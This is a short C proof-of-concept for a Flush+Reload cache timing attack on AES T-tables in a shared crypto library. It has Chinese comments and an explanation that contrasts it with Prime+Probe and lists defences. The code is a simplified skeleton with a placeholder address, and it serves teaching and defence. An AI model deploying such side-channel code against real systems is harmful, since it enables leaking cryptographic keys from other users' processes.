#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <unistd.h>
#include <sys/mman.h>
#include <dlfcn.h>

// 假设AES T-table地址（实际需从libcrypto.so获取）
#define T0_ADDR 0x7f1234567890  // 示例地址

// 测量内存访问时间（使用RDTSCP）
static inline uint64_t rdtscp() {
    unsigned int aux;
    return __rdtscp(&aux);
}

// 刷新缓存行
void flush(void *addr) {
    _mm_clflush(addr);
}

// 重新加载并测量时间
uint64_t reload(void *addr) {
    volatile uint64_t time;
    uint64_t start, end;
    start = rdtscp();
    // 读取内存，强制缓存加载
    (void)*(volatile char *)addr;
    end = rdtscp();
    return end - start;
}

int main() {
    // 获取共享库中T0表的地址（实际需通过/proc/self/maps或dlsym）
    void *t0_addr = (void*)T0_ADDR;

    // 攻击循环：监控特定索引
    int target_index = 0x42; // 假设要监控的索引
    void *target = t0_addr + target_index * 4; // 每个条目4字节

    // 先刷新
    flush(target);
    usleep(100); // 等待受害者执行

    // 重新加载并测量
    uint64_t time = reload(target);

    // 判断：如果时间小于阈值（如100周期），则受害者访问过
    if (time < 100) {
        printf("受害者访问了索引0x%x\n", target_index);
    } else {
        printf("未访问\n");
    }

    return 0;
}


实际攻击中，攻击者需要：1）确定共享库中T-table的虚拟地址（通过/proc/self/maps或dlsym）；2）与受害者同步（如通过CPU亲和性、定时）；3）对每个可能的索引进行多次测量，统计时间分布。防御方法包括：使用无表AES（如AES-NI指令）、缓存分区、刷缓存、禁用超线程等。Flush+Reload攻击在Intel处理器上特别有效，因为clflush指令和缓存一致性协议。CVE-2017-5753/5754等侧信道漏洞也利用了类似原理。

Prime+Probe是一种缓存侧信道攻击，不需要与受害者共享内存，适用于隔离环境（如云虚拟机）。攻击者首先“填充”（Prime）一组缓存集（例如L1数据缓存的特定集合），然后等待受害者执行，最后“探测”（Probe）同一组缓存集，测量访问时间。如果受害者访问了与攻击者相同缓存集的内存，则会驱逐攻击者的缓存行，导致探测时间变长。通过监控哪些缓存集被驱逐，可以推断受害者的访问模式。

与Flush+Reload对比：Flush+Reload需要共享内存（如动态库），利用clflush指令和缓存一致性，精度高但适用场景有限；Prime+Probe不需要共享内存，但需要知道受害者的缓存集映射（如虚拟地址到缓存集的映射），且噪声较大，需要更多样本。

